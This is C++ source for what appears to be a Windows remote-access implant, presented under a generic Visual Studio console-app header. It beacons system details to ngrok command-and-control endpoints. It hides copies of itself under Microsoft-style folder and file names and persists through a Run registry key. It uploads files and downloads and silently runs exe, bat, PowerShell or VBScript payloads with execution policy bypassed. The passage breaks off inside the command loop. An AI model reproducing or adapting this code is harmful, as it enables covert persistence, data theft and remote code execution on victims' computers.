// ConsoleApplication1.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <filesystem>
#include <sstream>
#include <chrono>
#include <thread>
#include <windows.h>
#include <sddl.h>
#include <ctime>
#include <fstream>
#include <string>
#include <thread>
#include <winternl.h>
#include <Shlobj.h>
#include <ctime>
#include <unordered_map>
#include <stdexcept>
#include <cstdlib> // for std::getenv 
#include <nlohmann/json.hpp> // For JSON handling
#include <curl/curl.h>  // You will need to install libcurl for network requests



namespace fs = std::filesystem;


std::string APP_CONFIG_PATH = "C:\\MSPS";
std::string LOG_FILE_PATH = "C:\\MSPS\\MSPS.dll";
std::string TEMP_DIR = "";
std::string SYSTEM32_DIR = "";
std::string WEB_URL = "https://robust-ocelot-moderately.ngrok-free.app/api/parameters";  
std::string DOWN_LOAD_URL = "https://robust-ocelot-moderately.ngrok-free.app/download";
std::string SYSTEM_INFO_URL = "https://robust-ocelot-moderately.ngrok-free.app/web";  
std::string ERROR_REPORT_URL = "https://robust-ocelot-moderately.ngrok-free.app/reportexception"; 
std::string UPLOAD_FILE_URL = "https://robust-ocelot-moderately.ngrok-free.app/upload";  
std::string OPERATION_STATUS_URL = "https://robust-ocelot-moderately.ngrok-free.app/status";
std::string CONFIG_FILE_PATH = "C:\\MSPS\\config.json";
int TIME_TO_WAKE_UP = 3600;
std::string SESSION_TRACKER = "";

// forward declarations

void app_initialize();
bool isAdmin();
void mainLoop();
std::string get_ip_address();
bool sendSystemInfo(const std::string& url);
void logMessage(const std::string& message);
std::string get_appdata_local_path();
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::ofstream* file);
void send_error_report(const std::string& url, const std::string& error_message);
void copy_self(const std::string& destination_path);
void register_script();
void ensure_log_directory_exists(const std::string& log_file_path);
void load_config(const std::string& config_file_path);
size_t WriteCallback_S(void* contents, size_t size, size_t nmemb, std::string* userp);
std::string escape_json(const std::string& str);

struct ResponseType {
    long status_code;                          // HTTP status code
    std::string body;                          // Response body as a string
    nlohmann::json json_data;                  // Parsed JSON data

    // Function to parse JSON from the body
    bool parse_json() {
        try {
            json_data = nlohmann::json::parse(body);
            return true;
        }
        catch (const nlohmann::json::parse_error& e) {
            // Handle JSON parse error
            return false;
        }
    }
};
struct VersionInfo {
    std::string Major;
    std::string Minor;
    std::string BuildNum;

};
std::string get_env_variable(const std::string& var) {
    char* value = nullptr;
    size_t size = 0;
    if (_dupenv_s(&value, &size, var.c_str()) == 0 && value != nullptr) {
        std::string result(value);
        free(value); // Free the allocated memory
        return result;
    }
    return "Unknown"; // Default value
}


ResponseType call_api(const std::string& url, CURL* curl) {
    ResponseType response = { 0, "", nullptr }; // Initialize with default values
    std::string response_data; // To hold the response data

    try {
        // Prepare data
        std::string computer_name = get_env_variable("COMPUTERNAME");
        std::string username = get_env_variable("USERNAME");

        // Create JSON data
        nlohmann::json data = {
            {"param1", escape_json(computer_name)},
            {"param2", escape_json(username)}
        };
        std::string strRet;
        std::string json_data = data.dump(); // Serialize to string
        
        // Set up the CURL request
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        // Set the request type to POST
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        // Set the JSON data
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_data.c_str());
        // Set up the callback to capture the response
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback_S);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
        // Set this option to true to return the response instead of printing
       

        // Set the Content-Type to application/json
        struct curl_slist* headers = nullptr;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        //curl_easy_setopt(curl, CURLOPT_RETURNTRANSFER, strRet);
        // Perform the request
        CURLcode res = curl_easy_perform(curl);

        //long response_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response.status_code);

        if (res != CURLE_OK || response.status_code != 200) {
            logMessage("Call to API failed. Status code: " + std::to_string(response.status_code));
            SESSION_TRACKER += "->API Call 200 ";
        }
        else {
            // Populate the response body
            response.body = response_data;
            // Try to parse the JSON response
            if (!response.parse_json()) {
                logMessage("Failed to parse JSON response.");
                SESSION_TRACKER += "->API Call Failed JSON Parsing ";
            }
        }
        // Cleanup
        curl_easy_cleanup(curl);
        return response;
    } 
    catch (const std::exception& e) {
        logMessage("Call to API failed. Error: " + std::string(e.what()));
        SESSION_TRACKER += "-> API Call Exception ";
        return response; // Use a suitable CURLcode to indicate failure
    }
}
/*std::string get_windows_version() {
    OSVERSIONINFOEX version_info;
    version_info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

    // Call GetVersionEx without casting
    if (GetVersionEx(reinterpret_cast<LPOSVERSIONINFO>(&version_info))) {
        return std::to_string(version_info.dwMajorVersion) + "." +
            std::to_string(version_info.dwMinorVersion);
    }
    else {
        return "Unknown version"; // Handle error case
    }
}*/

//returns the path to temp folder
std::string get_temp_folder() {
    return std::filesystem::temp_directory_path().string();
}

bool GetVersion(VersionInfo& info)
{
//int osver = 0.0;

    NTSTATUS(WINAPI * RtlGetVersion)(LPOSVERSIONINFOEXW);

    OSVERSIONINFOEXW osInfo;

    *(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");

    if (NULL != RtlGetVersion)
    {
        osInfo.dwOSVersionInfoSize = sizeof(osInfo);
        RtlGetVersion(&osInfo);
        std::ostringstream stream;
        stream << osInfo.dwMajorVersion;
        info.Major = stream.str();
        stream << osInfo.dwMinorVersion;
        info.Minor = stream.str();
        stream << osInfo.dwMinorVersion;
        info.BuildNum = stream.str();
    }

    return true; 
}

std::string get_architecture() {
    SYSTEM_INFO sys_info;
    GetSystemInfo(&sys_info);

    switch (sys_info.wProcessorArchitecture) {
    case PROCESSOR_ARCHITECTURE_AMD64:
        return "x64 (AMD or Intel)";
    case PROCESSOR_ARCHITECTURE_ARM:
        return "ARM";
    case PROCESSOR_ARCHITECTURE_ARM64:
        return "ARM64";
    case PROCESSOR_ARCHITECTURE_INTEL:
        return "x86 (32-bit)";
    default:
        return "Unknown architecture";
    }
}

std::string get_current_time() {
    std::string date_time;
    {
        time_t now = time(0);
        struct tm localTime;
        localtime_s(&localTime, &now); // Use localtime_s
        char buf[80];
        strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &localTime);
        date_time = buf;
    }

    return date_time;
}

bool sendSystemInfo(const std::string& url) {
    try {
        // Prepare data
        std::string ip_address = get_ip_address();
        std::string computer_name = get_env_variable("COMPUTERNAME");
        std::string username = get_env_variable("USERNAME");;

        VersionInfo info;
        std::string ver_info = "";
        if (GetVersion(info))
        { 
            ver_info = info.Major + "." + info.Minor + "." + info.BuildNum;
        }
        //std::string os_info;
        
        std::string os_info = "Windows :" + ver_info + " CHIP Set: " + get_architecture();

        // Get current date and time
        auto now = std::chrono::system_clock::now();
        std::time_t now_time = std::chrono::system_clock::to_time_t(now);
        std::string date_time = get_current_time();
        date_time.pop_back(); // Remove the newline character

        // Prepare JSON data
        nlohmann::json data = {
            {"param1", escape_json(ip_address)},
            {"param2", escape_json(computer_name)},
            {"param3", escape_json(username)},
            {"param4", escape_json(os_info)},
            {"param5", escape_json(date_time)}
        };

        // Send HTTP POST request
        CURL* curl = curl_easy_init();
        if (curl) {
            std::string json_data = data.dump(); // Serialize to string

            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            // Set the request type to POST
            curl_easy_setopt(curl, CURLOPT_POST, 1L);
            // Set the JSON data
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_data.c_str());
            // Set the Content-Type to application/json
            struct curl_slist* headers = nullptr;
            headers = curl_slist_append(headers, "Content-Type: application/json");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            
            CURLcode res = curl_easy_perform(curl);
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            curl_easy_cleanup(curl);

            if (res == CURLE_OK && (response_code == 200 || response_code == 201)) {
                logMessage("System info sent successfully: " + json_data);
                SESSION_TRACKER += "->System Info 200 or 201";
                return true;
            }
            else {
                logMessage("Failed to send system info. Status code: " + std::to_string(response_code));
                SESSION_TRACKER += "->System Info Filed Response";
                return false;
            }
        }
    }
    catch (const std::exception& e) {
        logMessage("Exception sending system info: " + std::string(e.what()));
        SESSION_TRACKER += "-> System Info Exception";
    }
    return false;
}
/*bool send_operation_status(const std::string& operation_status_url) {
    try {
        // Prepare the JSON data
        nlohmann::json data;
        data["param1"] = std::getenv("COMPUTERNAME") ? std::getenv("COMPUTERNAME") : "Unknown"; // system_name
        data["param2"] = std::getenv("USERNAME") ? std::getenv("USERNAME") : "Unknown"; // logged_in_user
        data["param3"] = SESSION_TRACKER; // session tracker

        // Initialize CURL
        CURL* curl = curl_easy_init();
        if (curl) {
            // Set up CURL options
            curl_easy_setopt(curl, CURLOPT_URL, operation_status_url.c_str());
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.dump().c_str());
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, nullptr); // You can set headers here if needed

            // Perform the request
            CURLcode res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
                curl_easy_cleanup(curl);
                return false;
            }

            // Clean up
            curl_easy_cleanup(curl);
        }

        return true;
    }
    catch (const std::exception& e) {
        std::cerr << "Exception in Operation Status: " << e.what() << std::endl;
        return false;
    }
}
*/



void logMessage(const std::string& message) {
   // std::ofstream logFile(LOG_FILE_PATH, std::ios_base::app);
    //logFile << std::time(nullptr) << " - " << message << "\n";
    std::ofstream logFile(LOG_FILE_PATH, std::ios_base::app | std::ios_base::out);

    // Check if the file is open
    if (!logFile.is_open()) {
        std::cerr << "Error opening log file!" << std::endl;
        return;
    }

    // Get current time and format it
    std::time_t now = std::time(nullptr);
    logFile << std::time(&now) << " - " << message << "\n";

    // Close the log file
    logFile.close();
}

std::string escape_json(const std::string& str) {
    std::string escaped;
    for (char c : str) {
        switch (c) {
        case '"':  escaped += "\\\""; break;
        case '\\': escaped += "\\\\"; break;
        case '\b': escaped += "\\b"; break;
        case '\f': escaped += "\\f"; break;
        case '\n': escaped += "\\n"; break;
        case '\r': escaped += "\\r"; break;
        case '\t': escaped += "\\t"; break;
        default: escaped += c; break;
        }
    }
    return escaped;
}

bool isAdmin() {
    BOOL isAdminA;
    PSID adminGroup;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,
        &adminGroup);
    CheckTokenMembership(NULL, adminGroup, &isAdminA);
    FreeSid(adminGroup);
    SESSION_TRACKER += "-> isAdmin ";
    return isAdminA;
}

//void downloadFile(const std::string& url, const std::string& path) {
//    // Use libcurl to download the file
//    CURL* curl;
//    FILE* fp;
//    CURLcode res;
//    try {
//        curl = curl_easy_init();
//        if (curl) {
//            //fp = fopen(path.c_str(), "wb");
//            if (fopen_s(&fp, path.c_str(), "wb") == 0) { // Check if file opened successfully
//                curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
//                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
//                curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
//                res = curl_easy_perform(curl);
//                fclose(fp);
//                curl_easy_cleanup(curl);
//            }
//            SESSION_TRACKER += "->Download File Done";
//        }
//        else {
//            logMessage("Failed to download");
//            SESSION_TRACKER += "->Download File Failed";
//        }
//    }
//    catch (const std::exception& e) {
//        logMessage("Problem with copying executable to app folder: " + std::string(e.what()));
//        SESSION_TRACKER += "->Download File Exception";
//        send_error_report(ERROR_REPORT_URL, "Problem with downloading file: " + std::string(e.what()));
//    }
//}


void app_initialize() {
    LOG_FILE_PATH = get_appdata_local_path() + "MSPS_Log.dll";
    CONFIG_FILE_PATH = get_appdata_local_path() + "config.json";
    ensure_log_directory_exists(LOG_FILE_PATH);

    // Check if the config file exists
    if (fs::exists(CONFIG_FILE_PATH)) {
        load_config(CONFIG_FILE_PATH);
    }
    // Try to copy this executable to app folder
    copy_self(LOG_FILE_PATH);

    // Get the path of the current executable
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);

    std::filesystem::path currentPath(buffer);

    // Get the path of the Windows Temp directory
    char tempPathBuffer[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPathBuffer);
    std::filesystem::path tempPath(tempPathBuffer);

    // If the current path is Temp dir then this is the first run so try to register
    if (currentPath.parent_path() == tempPath) {
        // Try to register this app to run on Windows start
        register_script();
    }
   

    
    
    SESSION_TRACKER += "->App Initialize Done";
}
std::string get_appdata_local_path() {
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, path))) {
        return std::string(path) + "\\Microsoft\\MSPS\\";
    }
    throw std::runtime_error("Failed to get AppData local path");
}

void ensure_log_directory_exists(const std::string& log_file_path) {
    fs::path log_dir = fs::path(log_file_path).parent_path();
    if (!fs::exists(log_dir)) {
        fs::create_directories(log_dir);
        SESSION_TRACKER += "->Log Dir Created";
    }
}

void load_config(const std::string& config_file_path) {
    
    try {
        std::ifstream config_file(config_file_path);
        if (!config_file.is_open()) {
            throw std::runtime_error("Could not open the configuration file.");
        }

        nlohmann::json config;
        config_file >> config; // Load JSON from file

        WEB_URL = config.value("WEB_URL", "");
        DOWN_LOAD_URL = config.value("DOWN_LOAD_URL", "");
        SYSTEM_INFO_URL = config.value("SYSTEM_INFO_URL", "");
        ERROR_REPORT_URL = config.value("ERROR_REPORT_URL", "");
        UPLOAD_FILE_URL = config.value("UPLOAD_FILE_URL", "");
        OPERATION_STATUS_URL = config.value("OPERATION_STATUS_URL", "");
        TIME_TO_WAKE_UP = config.value("TIME_TO_WAKE_UP", 0);
        SESSION_TRACKER += "->Config File Loaded";
    }
    catch (const std::exception& e) {
        logMessage("Problem opening config file: " + std::string(e.what()));
        send_error_report(ERROR_REPORT_URL, "Problem loading config file: " + std::string(e.what()));
        SESSION_TRACKER += "->Config File Exception";
    }

}


void copy_self(const std::string& destination_path) {
    /*char current_file[MAX_PATH];
    GetModuleFileNameA(nullptr, current_file, MAX_PATH);
    fs::copy_file(current_file, destination_path, fs::copy_options::overwrite_existing);
    SESSION_TRACKER += "->Copy Self Done";*/

    try {
        // Get the path of the current executable
        char buffer[MAX_PATH];
        GetModuleFileNameA(nullptr, buffer, MAX_PATH);
        std::string scriptPath = buffer;

        // Define the log directory and script parent path
        std::filesystem::path logDir(destination_path);
        std::filesystem::path scriptParent = std::filesystem::path(scriptPath).parent_path();
        std::filesystem::path VBSFile = scriptParent / "msps.vbs";
        // Define the destination path for the copy
        if (!std::filesystem::exists(logDir.parent_path())) {
            std::filesystem::create_directories(logDir.parent_path());
        }

        std::filesystem::path destinationPathE = logDir.parent_path() / "msps.exe";
        std::filesystem::path destinationPathS = logDir.parent_path() / "msps.vbs";

        // Copy the executable to the destination folder
        if (logDir.parent_path() != scriptParent) {
            std::filesystem::copy_file(scriptPath, destinationPathE, std::filesystem::copy_options::overwrite_existing);
            std::filesystem::copy_file(VBSFile, destinationPathS, std::filesystem::copy_options::overwrite_existing);
        }
        SESSION_TRACKER += "->Copy Self Done";
    }
    catch (const std::exception& e) {
        logMessage("Problem with copying executable to app folder: " + std::string(e.what()));
        SESSION_TRACKER += "->Copy Self Exception";
        send_error_report(ERROR_REPORT_URL, "Problem with copying executable to app folder: " + std::string(e.what()));
    }
}

void register_script() {
    try {
        // Define the registry key and value
        const std::string key = R"(Software\Microsoft\Windows\CurrentVersion\Run)";
        const std::string value_name = "MSPS";

        // Open or create the registry key
        HKEY reg_key;
        LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, key.c_str(), 0, KEY_SET_VALUE, &reg_key);
        if (result != ERROR_SUCCESS) {
            // Create the key if it doesn't exist
            result = RegCreateKeyExA(HKEY_CURRENT_USER, key.c_str(), 0, nullptr, 0, KEY_SET_VALUE, nullptr, &reg_key, nullptr);
            if (result != ERROR_SUCCESS) {
                SESSION_TRACKER += "->Register Script Failed1";
                throw std::runtime_error("Failed to create registry key.");
            }
        }

        // Set the value to the path of the executable
        //char current_file[MAX_PATH];
        //GetModuleFileNameA(nullptr, current_file, MAX_PATH);
        fs::path log_dir = fs::path(CONFIG_FILE_PATH).parent_path();
         fs::path destination_path = log_dir / "msps.vbs";

        result = RegSetValueExA(reg_key, value_name.c_str(), 0, REG_SZ, (const BYTE*)destination_path.string().c_str(), destination_path.string().length() + 1);
        if (result != ERROR_SUCCESS) {
            SESSION_TRACKER += "->Register Script Failed2";
            throw std::runtime_error("Failed to set registry value.");
        }

        // Close the registry key
        RegCloseKey(reg_key);
        SESSION_TRACKER += "->Register Script Done";
    }
    catch (const std::exception& e) {
        logMessage("Problem registering the exe: " + std::string(e.what()));
        SESSION_TRACKER += "->Register Script Exception";
        send_error_report("YOUR_ERROR_REPORT_URL", "Problem registering the exe: " + std::string(e.what())); // Replace with your error report URL
    }
}

void send_error_report(const std::string& url, const std::string& error_message) {
    try {
        ResponseType response = { 0, "", nullptr }; // Initialize with default values
        std::string response_data; // To hold the response data
        // Gather data
        std::string date_time;
        {
            time_t now = time(0);
            struct tm localTime;
            localtime_s(&localTime, &now); // Use localtime_s
            char buf[80];
            strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &localTime);
            date_time = buf;
        }

        VersionInfo info;
        std::string ver_info;
        if (GetVersion(info))
        {
            ver_info = "Winows :" + info.Major + "." + info.Minor + "." + info.BuildNum;
        }
        
        std::string computer_name = get_env_variable("COMPUTERNAME");
        std::string username = get_env_variable("USERNAME");
        
        std::string json_data = "{"
            "\"param1\":\"" + escape_json(error_message) + "\","
            "\"param2\":\"" + escape_json(date_time) + "\","
            "\"param3\":\"" + escape_json(get_ip_address()) + "\","
            "\"param4\":\"" + escape_json(computer_name) + "\","
            "\"param5\":\"" + escape_json(username) + "\","
            "\"param6\":\"" + escape_json(ver_info) + "\""
            "}";

        // Send HTTP POST request
        CURL* curl;
        CURLcode res;

        curl = curl_easy_init();
        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, ERROR_REPORT_URL.c_str());
            curl_easy_setopt(curl, CURLOPT_POST, 1L);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_data.c_str());
            struct curl_slist* headers = nullptr;
            headers = curl_slist_append(headers, "Content-Type: application/json");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            // Set up the callback to capture the response
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback_S);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
            //curl_easy_setopt(curl, CURLOPT_HTTPHEADER, curl_slist_append(nullptr, "Content-Type: application/json"));
            res = curl_easy_perform(curl);
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response.status_code);

            if (res != CURLE_OK && response.status_code != 201) {
                logMessage("Failed to send error report: " + std::string(curl_easy_strerror(res)));
                SESSION_TRACKER += "->Send Error Report Failed";
            }
            else {
                logMessage("Error report sent successfully: " + error_message);
                SESSION_TRACKER += "->Send Error Report Done";
            }
            curl_easy_cleanup(curl);
        }
    }
    catch (const std::exception& e) {
        logMessage("Exception sending error report: " + std::string(e.what()));
        SESSION_TRACKER += "->Send Error Report Exception";
    }
}

std::string get_ip_address() {
    CURL* curl;
    CURLcode res;
    std::string ip_address;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "https://api.ipify.org");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback_S);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &ip_address);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    SESSION_TRACKER += "->Get IP Done";
    return ip_address;
}

void upload_file(const std::string& url, const std::string& file_path) {
    try {
        //const char* computer_name = getenv("COMPUTERNAME");
        //const char* user_name = getenv("USERNAME");
        ResponseType response = { 0, "", nullptr }; // Initialize with default values
        std::string response_data; // To hold the response data
        //std::string system_name = computer_name ? computer_name : "Unknown";
        //std::string logged_in_user = user_name ? user_name : "Unknown";
        std::string computer_name = get_env_variable("COMPUTERNAME");
        std::string username = get_env_variable("USERNAME");
        
        // Create JSON object
        // Create JSON data
        nlohmann::json data = {
            {"param1", computer_name},
            {"param2", username}
        };

        // Initialize CURL
        CURL* curl;
        CURLcode res;

        curl = curl_easy_init();
        if (curl) {
            struct curl_httppost* formpost = nullptr;
            struct curl_httppost* lastptr = nullptr;

           
            // Add the JSON data
            /*std::string json_string = data.dump();
            curl_formadd(&formpost, &lastptr,
                CURLFORM_COPYNAME, "json_string",
                CURLFORM_COPYCONTENTS, json_string.c_str(),
                CURLFORM_CONTENTTYPE, "application/json",
                CURLFORM_END); */

                // Add form data
            curl_formadd(&formpost, &lastptr,
                CURLFORM_COPYNAME, "param1", // Field name
                CURLFORM_COPYCONTENTS, computer_name.c_str(), // Value
                CURLFORM_END);

            curl_formadd(&formpost, &lastptr,
                CURLFORM_COPYNAME, "param2", // Field name
                CURLFORM_COPYCONTENTS, username.c_str(), // Value
                CURLFORM_END);

            // Add the file
            curl_formadd(&formpost, &lastptr,
                CURLFORM_COPYNAME, "file",
                CURLFORM_FILE, file_path.c_str(),
                CURLFORM_CONTENTTYPE, "application/octet-stream",
                CURLFORM_END);

            // Set up the request
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback_S);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
            // Perform the request
            res = curl_easy_perform(curl);
            if (res != CURLE_OK && response.status_code != 200) {
                logMessage("Failed to upload file: " + std::string(curl_easy_strerror(res)));
                SESSION_TRACKER += "->Upload File Failed";
            }
            else {
                logMessage("File uploaded successfully: " + file_path);
                SESSION_TRACKER += "->Upload File Done";
            }

            // Clean up
            curl_easy_cleanup(curl);
            curl_formfree(formpost);
        }
    }
    catch (const std::exception& e) {
        logMessage("Exception uploading file: " + std::string(e.what()));
        SESSION_TRACKER += "->Upload File Exception";
    }
}

void download_file(const std::string& url, const std::string& path) {
    try {
        //const char* computer_name = getenv("COMPUTERNAME");
        //const char* user_name = getenv("USERNAME");
        

        //std::string system_name = computer_name ? computer_name : "Unknown";
        //std::string logged_in_user = user_name ? user_name : "Unknown";
        std::string computer_name = get_env_variable("COMPUTERNAME");
        std::string username = get_env_variable("USERNAME");

        // Initialize CURL
        CURL* curl;
        CURLcode res;

        curl = curl_easy_init();
        if (curl) {
            // Set up the JSON data to send
            std::string jsonData = "{\"param1\":\"" + escape_json(computer_name) + "\", \"param2\":\"" + escape_json(username) + "\"}";

            // Set options for the curl session
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonData.c_str());
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, curl_slist_append(nullptr, "Content-Type: application/json"));

            // Open file for writing
            std::ofstream file(path, std::ios::binary);
            if (!file.is_open()) {
                logMessage("Failed to open file for writing: " + path);
                SESSION_TRACKER += "->Download Failed File1";
                return;
            }

            // Set the write callback function
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &file);
            curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L); // Follow redirects

            // Perform the request
            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                logMessage("Failed to download file. Status code: " + std::to_string(res));
                SESSION_TRACKER += "->Download Failed File2";
            }
            else {
                logMessage("File downloaded successfully: " + path);
                SESSION_TRACKER += "->Download File Done";
            }

            // Clean up
            file.close();
            curl_easy_cleanup(curl);
        }
    }
    catch (const std::exception& e) {
        logMessage("Exception downloading file: " + std::string(e.what()));
        SESSION_TRACKER += "->Download File Exception";
    }
}
// Callback function to write data to a string
size_t WriteCallback_S(void* contents, size_t size, size_t nmemb, std::string* userp) {
    size_t total_size = size * nmemb;
    userp->append(static_cast<char*>(contents), total_size);
    return total_size;
}

// Callback function to write data to a file
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::ofstream* file) {
    size_t totalSize = size * nmemb;
    file->write(static_cast<const char*>(contents), totalSize);
    return totalSize;
}

void execute_file(const std::string& path, const std::string& file_type) {
    try {
            // Set up the process information and startup info
            STARTUPINFOA startupInfo;
            PROCESS_INFORMATION processInfo;

            ZeroMemory(&startupInfo, sizeof(startupInfo));
            startupInfo.cb = sizeof(startupInfo);
            startupInfo.dwFlags = STARTF_USESHOWWINDOW; // Use show window flag
            startupInfo.wShowWindow = SW_HIDE; // Hide the window
            ZeroMemory(&processInfo, sizeof(processInfo));

            std::string command;
            // Create the command string
            if (file_type == "exe" || file_type == "bat") {
               // For .exe and .bat files
                command = "\"" + path + "\"";
                //std::system(command.c_str());
                //logMessage("Executed: " + path);
            }
            else if (file_type == "ps1") {
                // For PowerShell scripts
                command = "powershell -ExecutionPolicy Bypass -File \"" + path + "\"";
                //std::system(command.c_str());
                //logMessage("Executed PS1: " + path);
            }
            else if (file_type == "vbs") {
                // For VBScript
                command = "cscript \"" + path + "\"";
                //std::system(command.c_str());
                //logMessage("Executed VBS: " + path);
            }
            else if (file_type == "json") {
                // Move the JSON file
                std::filesystem::path source(path);
                std::filesystem::path destination = get_appdata_local_path() + source.filename().string();
                std::filesystem::rename(source, destination); // Move the file
                logMessage("Moved JSON: " + path + " to " + destination.string());
                SESSION_TRACKER += "->Execute File json Copied";
                load_config(CONFIG_FILE_PATH);
                return;
            }
            else {
                logMessage("Unknown file type for execution: " + file_type);
            }
            // Create the process
            if (CreateProcessA(
                NULL,                // No module name (use command line)
                const_cast<LPSTR>(command.c_str()), // Command line
                NULL,                // Process handle not inheritable
                NULL,                // Thread handle not inheritable
                FALSE,              // Set handle inheritance to FALSE
                0,                  // No creation flags
                NULL,               // Use parent's environment block
                NULL,               // Use parent's starting directory 
                &startupInfo,      // Pointer to STARTUPINFO structure
                &processInfo)      // Pointer to PROCESS_INFORMATION structure
                ) {
                logMessage("Executed: " + path);
                // Close process and thread handles
                CloseHandle(processInfo.hProcess);
                CloseHandle(processInfo.hThread);
                SESSION_TRACKER += "->Execute File executed";
            }
            else {
                logMessage("Error executing file: " + std::to_string(GetLastError()));
                SESSION_TRACKER += "->Execute File Error";
            }

    }
    catch (const std::exception& e) {
        logMessage("Exception executing file " + path + ": " + std::string(e.what()));
        SESSION_TRACKER += "->Execute File Exception";
        send_error_report("ERROR_REPORT_URL", "Exception executing file " + path + ": " + e.what());
    }
}

bool send_operation_status() {
    try {
        ResponseType response = { 0, "", nullptr }; // Initialize with default values
        std::string response_data; // To hold the response data
        // Prepare data
        std::string computer_name = get_env_variable("COMPUTERNAME");
        std::string username = get_env_variable("USERNAME");;
        if (SESSION_TRACKER.length() > 100) {
            SESSION_TRACKER.substr(0, 99);
        }
        // JSON data as a string
        std::string json_data = "{\"param1\":\"" + escape_json(computer_name) + "\","
            "\"param2\":\"" + escape_json(username) + "\","
            "\"param3\":\"" + escape_json(SESSION_TRACKER) + "\"}";
        
        // Initialize CURL
        CURL* curl = curl_easy_init();
        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, OPERATION_STATUS_URL.c_str());
            curl_easy_setopt(curl, CURLOPT_POST, 1L);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_data.c_str());
            // Set the Content-Type to application/json
            struct curl_slist* headers = nullptr;
            headers = curl_slist_append(headers, "Content-Type: application/json");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            // Set up the callback to capture the response
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback_S);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
            
            // Perform the request
            CURLcode res = curl_easy_perform(curl);
            if (res != CURLE_OK && response.status_code != 200) {
                logMessage("Failed to send operation status: " + std::string(curl_easy_strerror(res)));
                SESSION_TRACKER += "->Send Ops Status Failed";
            }

            // Cleanup
            curl_easy_cleanup(curl);
            SESSION_TRACKER += "->Send Ops Status Done";
            return true;
        }
        else {
            logMessage("CURL initialization failed.");
            SESSION_TRACKER += "->Send Error Report Exception Failed";
            return false;
        }
    }
    catch (const std::exception& e) {
        logMessage("Exception in Operation Status: " + std::string(e.what()));
        SESSION_TRACKER += "->Send Ops Status Exception";
        return false;
    }
}
    void mainLoop() {
        try {
            //std::this_thread::sleep_for(std::chrono::minutes(5));  // Wait 5 minutes before starting
            app_initialize();
            sendSystemInfo(SYSTEM_INFO_URL);
            logMessage("Script started.");

            while (true) {
                try {
                    std::this_thread::sleep_for(std::chrono::seconds(TIME_TO_WAKE_UP));  // Wait before next request

                    CURL* curl = curl_easy_init();
                    ResponseType response; // Define the ResponseType to hold your API response
                    response = call_api(WEB_URL, curl);
                    if (response.status_code != 0) {
                        if (response.status_code == 200) {
                            //auto params = response.json_datajson(); // Ensure your ResponseType can handle JSON
                            //int params = response.json_data.max_size();
                            if (response.json_data.size() != 5) {
                                logMessage("Invalid response parameters.");
                                continue;
                            }

                            std::string command = response.json_data["command"];
                            std::string path = response.json_data["path"];
                            std::string filename = response.json_data["filename"];
                            std::string time_to_execute = response.json_data["timetoexecute"];
                            std::string go_to_sleep = response.json_data["gotosleep"];

                            if (command == "0") {
                                std::string admin_status = isAdmin() ? "1" : "0";
